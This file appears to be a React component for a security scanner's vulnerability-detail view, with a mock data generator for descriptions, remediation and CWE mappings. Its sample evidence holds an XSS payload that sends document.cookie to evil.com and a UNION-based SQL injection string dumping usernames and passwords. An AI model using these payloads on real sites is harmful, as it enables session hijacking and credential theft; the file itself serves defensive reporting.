'use client';

import { Badge, severityVariant } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { formatCvss, formatDate, severityColor } from '@/lib/utils';
import {
  AlertTriangle,
  ArrowRight,
  CheckCircle2,
  ChevronDown,
  ChevronRight,
  Code2,
  Copy,
  ExternalLink,
  FileWarning,
  Info,
  Layers,
  Shield,
  ShieldAlert,
  ShieldCheck,
  XCircle,
} from 'lucide-react';
import { useState } from 'react';

/* -------------------------------------------------------------------------- */
/*  Types                                                                     */
/* -------------------------------------------------------------------------- */

export interface VulnEvidence {
  type: 'request' | 'response' | 'code' | 'screenshot';
  label: string;
  content: string;
}

export interface VulnRemediation {
  priority: 'immediate' | 'short_term' | 'long_term';
  description: string;
  code?: string;
}

export interface VulnCweMapping {
  id: string;
  name: string;
  url: string;
}

export interface VulnComplianceMapping {
  framework: string;
  control: string;
  description: string;
}

export interface ExploitChainStep {
  order: number;
  title: string;
  description: string;
  technique: string;
  severity: string;
}

export interface VulnDetailData {
  id: string;
  title: string;
  severity: string;
  cvssScore: number;
  cvssVector?: string;
  category: string;
  target: string;
  endpoint: string;
  confidence: number;
  confirmed: boolean;
  discoveredAt: string;
  scanId: string;
  description: string;
  impact: string;
  evidence: VulnEvidence[];
  remediation: VulnRemediation[];
  cweMapping: VulnCweMapping[];
  complianceMapping: VulnComplianceMapping[];
  exploitChain: ExploitChainStep[];
  references: string[];
}

interface VulnDetailProps {
  vulnerability: VulnDetailData;
  onClose?: () => void;
}

/* -------------------------------------------------------------------------- */
/*  Mock detail data generator                                                */
/* -------------------------------------------------------------------------- */

/**
 * Generates a complete VulnDetailData from a basic vulnerability record.
 * In production, this would come from the API.
 */
export function generateMockDetail(
  vuln: {
    id: string;
    title: string;
    severity: string;
    cvssScore: number;
    category: string;
    target: string;
    endpoint: string;
    confidence: number;
    confirmed: boolean;
    discoveredAt: string;
    scanId: string;
  }
): VulnDetailData {
  const categoryDescriptions: Record<string, string> = {
    xss: 'A Cross-Site Scripting (XSS) vulnerability was discovered that allows an attacker to inject malicious client-side scripts into web pages viewed by other users. The injected script executes in the context of the victim\'s browser session, potentially allowing session hijacking, credential theft, or unauthorized actions.',
    sqli: 'A SQL Injection vulnerability was found that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view, modify, or delete data that they are not normally able to access, including data belonging to other users or any data that the application can access.',
    ssrf: 'A Server-Side Request Forgery (SSRF) vulnerability was identified that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker\'s choosing. This can be exploited to access internal services, cloud metadata endpoints, or perform port scanning of internal infrastructure.',
    idor: 'An Insecure Direct Object Reference (IDOR) vulnerability was found that allows an attacker to access resources belonging to other users by manipulating object references (such as IDs) in API requests. This bypasses authorization controls.',
    auth_bypass: 'An authentication bypass vulnerability was discovered that allows an attacker to gain unauthorized access to protected resources without providing valid credentials. This completely undermines the application\'s access control mechanisms.',
    rce: 'A Remote Code Execution (RCE) vulnerability was found that allows an attacker to execute arbitrary code on the target system. This is one of the most severe vulnerability classes as it gives the attacker complete control over the affected system.',
    smart_contract: 'A smart contract vulnerability was discovered that could allow an attacker to drain funds or manipulate contract state through exploitation of contract logic flaws.',
  };

  const categoryImpact: Record<string, string> = {
    xss: 'An attacker can steal session tokens, impersonate users, redirect victims to phishing pages, or perform actions on behalf of authenticated users. Stored XSS is particularly dangerous as it affects all users who view the infected page.',
    sqli: 'Complete database compromise including unauthorized data access, data modification, data deletion, and in some cases, command execution on the database server. This can lead to full application takeover.',
    ssrf: 'Access to internal services and cloud metadata (AWS IMDSv1, GCP metadata), internal port scanning, reading internal files, and potential remote code execution through internal service exploitation.',
    idor: 'Unauthorized access to other users\' private data including personal information, financial records, and sensitive documents. Can lead to large-scale data breaches.',
    auth_bypass: 'Complete bypass of authentication allows access to any user account including administrator accounts, leading to full application compromise.',
    rce: 'Full system compromise. The attacker can read/write any file, install backdoors, pivot to other systems, exfiltrate data, and establish persistent access.',
    smart_contract: 'Financial loss through fund draining, contract state manipulation, and potential cascading effects on dependent protocols and users.',
  };

  const description = categoryDescriptions[vuln.category]
    ?? `A ${vuln.category.replace('_', ' ')} vulnerability was identified on the target system. This issue requires immediate attention based on its severity classification.`;

  const impact = categoryImpact[vuln.category]
    ?? 'This vulnerability could allow unauthorized access or manipulation of the affected system depending on the exploitation context.';

  // Generate evidence based on category
  const evidence: VulnEvidence[] = [];
  if (vuln.category === 'xss') {
    evidence.push(
      {
        type: 'request',
        label: 'Malicious Request',
        content: `POST ${vuln.endpoint} HTTP/1.1\nHost: ${vuln.target.replace('https://', '')}\nContent-Type: application/json\nCookie: session=eyJhbGciOiJIUzI1NiJ9...\n\n{\n  "bio": "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>"\n}`,
      },
      {
        type: 'response',
        label: 'Server Response',
        content: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  "status": "success",\n  "user": {\n    "bio": "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>"\n  }\n}`,
      }
    );
  } else if (vuln.category === 'sqli') {
    evidence.push(
      {
        type: 'request',
        label: 'SQLi Payload',
        content: `GET ${vuln.endpoint}' OR 1=1 UNION SELECT username,password FROM users-- HTTP/1.1\nHost: ${vuln.target.replace('https://', '')}\nAuthorization: Bearer eyJhbGciOiJIUzI1NiJ9...`,
      },
      {
        type: 'response',
        label: 'Database Leak',
        content: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  "results": [\n    {"username": "admin", "password": "$2b$10$rOzSp..."},\n    {"username": "user1", "password": "$2b$10$kLmNp..."}\n  ]\n}`,
      }
    );
  } else {
    evidence.push({
      type: 'request',
      label: 'Proof of Concept',
      content: `# Automated detection by VulnHunter AI\n# Target: ${vuln.target}\n# Endpoint: ${vuln.endpoint}\n# Confidence: ${vuln.confidence}%\n\ncurl -X POST '${vuln.target}${vuln.endpoint}' \\\n  -H 'Content-Type: application/json' \\\n  -d '{"payload": "test"}'`,
    });
  }

  // Generate remediation
  const remediation: VulnRemediation[] = [
    {
      priority: 'immediate',
      description:
        vuln.severity === 'critical' || vuln.severity === 'high'
          ? 'Deploy a WAF rule to block exploitation while a permanent fix is developed.'
          : 'Review the affected code and apply input validation.',
      code: vuln.category === 'xss'
        ? `// Sanitize user input before rendering\nimport DOMPurify from 'dompurify';\n\nconst sanitized = DOMPurify.sanitize(userInput, {\n  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],\n  ALLOWED_ATTR: ['href']\n});`
        : vuln.category === 'sqli'
          ? `// Use parameterized queries\nconst result = await db.query(\n  'SELECT * FROM products WHERE name LIKE $1',\n  [\`%\${searchTerm}%\`]\n);`
          : undefined,
    },
    {
      priority: 'short_term',
      description: 'Implement proper input validation and output encoding at the application layer. Add Content Security Policy headers.',
    },
    {
      priority: 'long_term',
      description: 'Conduct a comprehensive security review of all similar endpoints. Implement automated SAST/DAST in the CI/CD pipeline.',
    },
  ];

  // CWE mappings
  const cweMappings: Record<string, VulnCweMapping[]> = {
    xss: [
      { id: 'CWE-79', name: 'Improper Neutralization of Input During Web Page Generation', url: 'https://cwe.mitre.org/data/definitions/79.html' },
      { id: 'CWE-116', name: 'Improper Encoding or Escaping of Output', url: 'https://cwe.mitre.org/data/definitions/116.html' },
    ],
    sqli: [
      { id: 'CWE-89', name: 'SQL Injection', url: 'https://cwe.mitre.org/data/definitions/89.html' },
      { id: 'CWE-20', name: 'Improper Input Validation', url: 'https://cwe.mitre.org/data/definitions/20.html' },
    ],
    ssrf: [
      { id: 'CWE-918', name: 'Server-Side Request Forgery', url: 'https://cwe.mitre.org/data/definitions/918.html' },
    ],
    idor: [
      { id: 'CWE-639', name: 'Authorization Bypass Through User-Controlled Key', url: 'https://cwe.mitre.org/data/definitions/639.html' },
    ],
    auth_bypass: [
      { id: 'CWE-287', name: 'Improper Authentication', url: 'https://cwe.mitre.org/data/definitions/287.html' },
      { id: 'CWE-347', name: 'Improper Verification of Cryptographic Signature', url: 'https://cwe.mitre.org/data/definitions/347.html' },
    ],
    rce: [
      { id: 'CWE-502', name: 'Deserialization of Untrusted Data', url: 'https://cwe.mitre.org/data/definitions/502.html' },
    ],
    smart_contract: [
      { id: 'SWC-107', name: 'Reentrancy', url: 'https://swcregistry.io/docs/SWC-107' },
    ],
  };

  // Compliance mappings
  const complianceMapping: VulnComplianceMapping[] = [
    {
      framework: 'OWASP Top 10',
      control: vuln.category === 'xss' ? 'A03:2021' : vuln.category === 'sqli' ? 'A03:2021' : 'A01:2021',
      description: vuln.category === 'xss' || vuln.category === 'sqli' ? 'Injection' : 'Broken Access Control',
    },
    {
      framework: 'PCI DSS 4.0',
      control: '6.2.4',
      description: 'Software engineering techniques or other methods are defined and in use by software development personnel to prevent or mitigate common software attacks.',
    },
    {
      framework: 'NIST 800-53',
      control: 'SI-10',
      description: 'Information Input Validation',
    },
  ];

  // Exploit chain
  const exploitChain: ExploitChainStep[] = [];
  if (vuln.severity === 'critical' || vuln.severity === 'high') {
    exploitChain.push(
      {
        order: 1,
        title: 'Reconnaissance',
        description: 'Identify target endpoint and application behavior',
        technique: 'Automated crawling and fuzzing',
        severity: 'info',
      },
      {
        order: 2,
        title: 'Vulnerability Discovery',
        description: `${vuln.title} detected on ${vuln.endpoint}`,
        technique: vuln.category.replace('_', ' ').toUpperCase(),
        severity: vuln.severity,
      },
      {
        order: 3,
        title: 'Exploitation',
        description: 'Craft payload to trigger the vulnerability',
        technique: 'Custom payload generation',
        severity: vuln.severity,
      },
      {
        order: 4,
        title: 'Impact',
        description: vuln.cvssScore >= 9 ? 'Full system compromise achieved' : 'Sensitive data accessed or modified',
        technique: 'Post-exploitation',
        severity: 'critical',
      }
    );
  }

  return {
    ...vuln,
    cvssVector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:${vuln.category === 'xss' ? 'R' : 'N'}/S:U/C:H/I:H/A:${vuln.cvssScore >= 9 ? 'H' : 'N'}`,
    description,
    impact,
    evidence,
    remediation,
    cweMapping: cweMappings[vuln.category] ?? [{ id: 'CWE-20', name: 'Improper Input Validation', url: 'https://cwe.mitre.org/data/definitions/20.html' }],
    complianceMapping,
    exploitChain,
    references: [
      `https://owasp.org/Top10/A03_2021-Injection/`,
      `https://cwe.mitre.org/data/definitions/${vuln.category === 'xss' ? '79' : vuln.category === 'sqli' ? '89' : '20'}.html`,
    ],
  };
}

/* -------------------------------------------------------------------------- */
/*  Sub-components                                                            */
/* -------------------------------------------------------------------------- */

function CvssScoreBadge({ score }: { score: number }) {
  let color = 'text-blue-400 bg-blue-500/15 border-blue-500/30';
  let label = 'Low';
  if (score >= 9) {
    color = 'text-red-400 bg-red-500/15 border-red-500/30';
    label = 'Critical';
  } else if (score >= 7) {
    color = 'text-orange-400 bg-orange-500/15 border-orange-500/30';
    label = 'High';
  } else if (score >= 4) {
    color = 'text-yellow-400 bg-yellow-500/15 border-yellow-500/30';
    label = 'Medium';
  }

  return (
    <div className={`inline-flex items-center gap-2 rounded-lg border px-3 py-2 ${color}`}>
      <span className="text-2xl font-bold font-mono">{formatCvss(score)}</span>
      <div className="text-left">
        <span className="block text-xs font-semibold uppercase">{label}</span>
        <span className="block text-[10px] opacity-70">CVSS 3.1</span>
      </div>
    </div>
  );
}

function CodeBlock({ content, label }: { content: string; label: string }) {
  const [copied, setCopied] = useState(false);

  const handleCopy = () => {
    navigator.clipboard.writeText(content);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="rounded-lg border border-slate-700/30 bg-slate-900/80 overflow-hidden">
      <div className="flex items-center justify-between px-4 py-2 border-b border-slate-700/30 bg-slate-800/30">
        <span className="text-xs font-medium text-slate-400">{label}</span>
        <button
          onClick={handleCopy}
          className="flex items-center gap-1 text-xs text-slate-500 hover:text-slate-300 transition-colors"
        >
          <Copy className="h-3 w-3" />
          {copied ? 'Copied' : 'Copy'}
        </button>
      </div>
      <pre className="px-4 py-3 text-xs text-slate-300 font-mono overflow-x-auto leading-relaxed whitespace-pre-wrap">
        {content}
      </pre>
    </div>
  );
}

function ExploitChainViz({ steps }: { steps: ExploitChainStep[] }) {
  if (steps.length === 0) return null;

  return (
    <div className="space-y-3">
      <h3 className="text-sm font-semibold text-slate-200 flex items-center gap-2">
        <Layers className="h-4 w-4 text-purple-400" />
        Exploit Chain
      </h3>
      <div className="relative">
        {steps.map((step, index) => (
          <div key={step.order} className="flex items-start gap-4 mb-4 last:mb-0">
            {/* Timeline connector */}
            <div className="flex flex-col items-center shrink-0">
              <div
                className={`h-8 w-8 rounded-full border-2 flex items-center justify-center text-xs font-bold ${
                  step.severity === 'critical'
                    ? 'border-red-500/50 bg-red-500/15 text-red-400'
                    : step.severity === 'high'
                      ? 'border-orange-500/50 bg-orange-500/15 text-orange-400'
                      : step.severity === 'info'
                        ? 'border-slate-500/50 bg-slate-500/15 text-slate-400'
                        : 'border-yellow-500/50 bg-yellow-500/15 text-yellow-400'
                }`}
              >
                {step.order}
              </div>
              {index < steps.length - 1 && (
                <div className="w-px h-8 bg-gradient-to-b from-slate-600 to-slate-800" />
              )}
            </div>

            {/* Step content */}
            <div className="flex-1 rounded-lg border border-slate-700/30 bg-slate-800/20 p-3 min-w-0">
              <div className="flex items-center justify-between mb-1">
                <span className="text-sm font-medium text-slate-200">
                  {step.title}
                </span>
                <Badge
                  variant={severityVariant(step.severity)}
                  className="text-[10px]"
                >
                  {step.severity}
                </Badge>
              </div>
              <p className="text-xs text-slate-400">{step.description}</p>
              <div className="flex items-center gap-1.5 mt-1.5">
                <Code2 className="h-3 w-3 text-slate-500" />
                <span className="text-[11px] text-slate-500 font-mono">
                  {step.technique}
                </span>
              </div>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

function RemediationPriorityBadge({ priority }: { priority: string }) {
  switch (priority) {
    case 'immediate':
      return (
        <span className="inline-flex items-center gap-1 text-[10px] font-semibold uppercase tracking-wider text-red-400 bg-red-500/15 border border-red-500/30 rounded px-2 py-0.5">
          <AlertTriangle className="h-3 w-3" />
          Immediate
        </span>
      );
    case 'short_term':
      return (
        <span className="inline-flex items-center gap-1 text-[10px] font-semibold uppercase tracking-wider text-yellow-400 bg-yellow-500/15 border border-yellow-500/30 rounded px-2 py-0.5">
          Short Term
        </span>
      );
    case 'long_term':
      return (
        <span className="inline-flex items-center gap-1 text-[10px] font-semibold uppercase tracking-wider text-blue-400 bg-blue-500/15 border border-blue-500/30 rounded px-2 py-0.5">
          Long Term
        </span>
      );
    default:
      return null;
  }
}

/* -------------------------------------------------------------------------- */
/*  Main Component                                                            */
/* -------------------------------------------------------------------------- */

export function VulnDetail({ vulnerability, onClose }: VulnDetailProps) {
  const [expandedSections, setExpandedSections] = useState<Set<string>>(
    new Set(['description', 'evidence', 'remediation', 'cwe', 'compliance', 'chain'])
  );

  const toggleSection = (section: string) => {
    setExpandedSections((prev) => {
      const next = new Set(prev);
      if (next.has(section)) {
        next.delete(section);
      } else {
        next.add(section);
      }
      return next;
    });
  };

  const SectionHeader = ({
    id,
    title,
    icon: Icon,
    iconColor,
  }: {
    id: string;
    title: string;
    icon: React.ElementType;
    iconColor: string;
  }) => (
    <button
      onClick={() => toggleSection(id)}
      className="flex items-center justify-between w-full py-3 text-left group"
    >
      <div className="flex items-center gap-2">
        <Icon className={`h-4 w-4 ${iconColor}`} />
        <span className="text-sm font-semibold text-slate-200 group-hover:text-slate-100 transition-colors">
          {title}
        </span>
      </div>
      {expandedSections.has(id) ? (
        <ChevronDown className="h-4 w-4 text-slate-500" />
      ) : (
        <ChevronRight className="h-4 w-4 text-slate-500" />
      )}
    </button>
  );

  return (
    <div className="space-y-6 animate-fade-in">
      {/* Header */}
      <div className="flex items-start justify-between">
        <div className="space-y-3 flex-1 min-w-0">
          <div className="flex items-center gap-3 flex-wrap">
            <Badge
              variant={severityVariant(vulnerability.severity)}
              className="text-xs"
            >
              {vulnerability.severity}
            </Badge>
            {vulnerability.confirmed ? (
              <div className="flex items-center gap-1 text-xs text-emerald-400">
                <CheckCircle2 className="h-3.5 w-3.5" />
                Confirmed
              </div>
            ) : (
              <div className="flex items-center gap-1 text-xs text-slate-500">
                <XCircle className="h-3.5 w-3.5" />
                Unconfirmed
              </div>
            )}
            <span className="text-xs text-slate-500">
              {vulnerability.confidence}% confidence
            </span>
          </div>
          <h2 className="text-xl font-bold text-slate-100">
            {vulnerability.title}
          </h2>
          <div className="flex items-center gap-4 text-sm text-slate-400">
            <span className="font-mono text-xs">{vulnerability.id}</span>
            <span className="text-slate-600">|</span>
            <span>Discovered {formatDate(vulnerability.discoveredAt)}</span>
            <span className="text-slate-600">|</span>
            <span className="font-mono text-xs">{vulnerability.scanId}</span>
          </div>
        </div>
        <div className="flex items-center gap-3 shrink-0 ml-4">
          <CvssScoreBadge score={vulnerability.cvssScore} />
          {onClose && (
            <Button variant="ghost" size="icon" onClick={onClose}>
              <XCircle className="h-5 w-5" />
            </Button>
          )}
        </div>
      </div>

      {/* Target and endpoint */}
      <div className="grid grid-cols-2 gap-4">
        <div className="rounded-lg bg-slate-800/30 border border-slate-700/30 p-4">
          <p className="text-xs text-slate-500 uppercase tracking-wider mb-1">
            Target
          </p>
          <p className="text-sm font-mono text-slate-200 truncate">
            {vulnerability.target}
          </p>
        </div>
        <div className="rounded-lg bg-slate-800/30 border border-slate-700/30 p-4">
          <p className="text-xs text-slate-500 uppercase tracking-wider mb-1">
            Endpoint
          </p>
          <p className="text-sm font-mono text-slate-200 truncate">
            {vulnerability.endpoint}
          </p>
        </div>
      </div>

      {/* CVSS Vector */}
      {vulnerability.cvssVector && (
        <div className="rounded-lg bg-slate-800/30 border border-slate-700/30 p-4">
          <p className="text-xs text-slate-500 uppercase tracking-wider mb-1">
            CVSS Vector
          </p>
          <p className="text-sm font-mono text-slate-300">
            {vulnerability.cvssVector}
          </p>
        </div>
      )}

      {/* Collapsible sections */}
      <div className="space-y-1">
        {/* Description & Impact */}
        <div className="border-b border-slate-700/30">
          <SectionHeader
            id="description"
            title="Description & Impact"
            icon={Info}
            iconColor="text-blue-400"
          />
          {expandedSections.has('description') && (
            <div className="pb-4 space-y-4 animate-slide-down">
              <div>
                <p className="text-xs text-slate-500 uppercase tracking-wider mb-2">
                  Description
                </p>
                <p className="text-sm text-slate-300 leading-relaxed">
                  {vulnerability.description}
                </p>
              </div>
              <div>
                <p className="text-xs text-slate-500 uppercase tracking-wider mb-2">
                  Impact
                </p>
                <p className="text-sm text-slate-300 leading-relaxed">
                  {vulnerability.impact}
                </p>
              </div>
            </div>
          )}
        </div>

        {/* Evidence */}
        {vulnerability.evidence.length > 0 && (
          <div className="border-b border-slate-700/30">
            <SectionHeader
              id="evidence"
              title={`Evidence (${vulnerability.evidence.length})`}
              icon={FileWarning}
              iconColor="text-orange-400"
            />
            {expandedSections.has('evidence') && (
              <div className="pb-4 space-y-3 animate-slide-down">
                {vulnerability.evidence.map((ev, index) => (
                  <CodeBlock
                    key={index}
                    content={ev.content}
                    label={ev.label}
                  />
                ))}
              </div>
            )}
          </div>
        )}

        {/* Remediation */}
        {vulnerability.remediation.length > 0 && (
          <div className="border-b border-slate-700/30">
            <SectionHeader
              id="remediation"
              title="Remediation"
              icon={ShieldCheck}
              iconColor="text-emerald-400"
            />
            {expandedSections.has('remediation') && (
              <div className="pb-4 space-y-4 animate-slide-down">
                {vulnerability.remediation.map((rem, index) => (
                  <div
                    key={index}
                    className="rounded-lg border border-slate-700/30 bg-slate-800/20 p-4 space-y-3"
                  >
                    <div className="flex items-center gap-2">
                      <RemediationPriorityBadge priority={rem.priority} />
                    </div>
                    <p className="text-sm text-slate-300">{rem.description}</p>
                    {rem.code && (
                      <CodeBlock content={rem.code} label="Fix Example" />
                    )}
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* CWE Mapping */}
        {vulnerability.cweMapping.length > 0 && (
          <div className="border-b border-slate-700/30">
            <SectionHeader
              id="cwe"
              title="CWE Mapping"
              icon={ShieldAlert}
              iconColor="text-red-400"
            />
            {expandedSections.has('cwe') && (
              <div className="pb-4 space-y-2 animate-slide-down">
                {vulnerability.cweMapping.map((cwe) => (
                  <div
                    key={cwe.id}
                    className="flex items-center justify-between rounded-lg border border-slate-700/30 bg-slate-800/20 px-4 py-3"
                  >
                    <div className="flex items-center gap-3">
                      <Badge variant="destructive" className="text-[10px] font-mono">
                        {cwe.id}
                      </Badge>
                      <span className="text-sm text-slate-300">{cwe.name}</span>
                    </div>
                    <a
                      href={cwe.url}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="text-slate-500 hover:text-blue-400 transition-colors"
                    >
                      <ExternalLink className="h-3.5 w-3.5" />
                    </a>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* Compliance Mapping */}
        {vulnerability.complianceMapping.length > 0 && (
          <div className="border-b border-slate-700/30">
            <SectionHeader
              id="compliance"
              title="Compliance Mapping"
              icon={Shield}
              iconColor="text-cyan-400"
            />
            {expandedSections.has('compliance') && (
              <div className="pb-4 animate-slide-down">
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                  {vulnerability.complianceMapping.map((comp, index) => (
                    <div
                      key={index}
                      className="rounded-lg border border-slate-700/30 bg-slate-800/20 p-3"
                    >
                      <div className="flex items-center gap-2 mb-1.5">
                        <Badge variant="brand" className="text-[10px]">
                          {comp.framework}
                        </Badge>
                      </div>
                      <p className="text-sm font-mono font-semibold text-slate-200 mb-0.5">
                        {comp.control}
                      </p>
                      <p className="text-xs text-slate-400 line-clamp-2">
                        {comp.description}
                      </p>
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        )}

        {/* Exploit Chain */}
        {vulnerability.exploitChain.length > 0 && (
          <div className="border-b border-slate-700/30">
            <SectionHeader
              id="chain"
              title="Exploit Chain"
              icon={Layers}
              iconColor="text-purple-400"
            />
            {expandedSections.has('chain') && (
              <div className="pb-4 animate-slide-down">
                <ExploitChainViz steps={vulnerability.exploitChain} />
              </div>
            )}
          </div>
        )}
      </div>

      {/* References */}
      {vulnerability.references.length > 0 && (
        <div>
          <p className="text-xs text-slate-500 uppercase tracking-wider mb-2">
            References
          </p>
          <div className="space-y-1.5">
            {vulnerability.references.map((ref, index) => (
              <a
                key={index}
                href={ref}
                target="_blank"
                rel="noopener noreferrer"
                className="flex items-center gap-2 text-sm text-blue-400 hover:text-blue-300 transition-colors"
              >
                <ExternalLink className="h-3.5 w-3.5 shrink-0" />
                <span className="truncate">{ref}</span>
              </a>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}
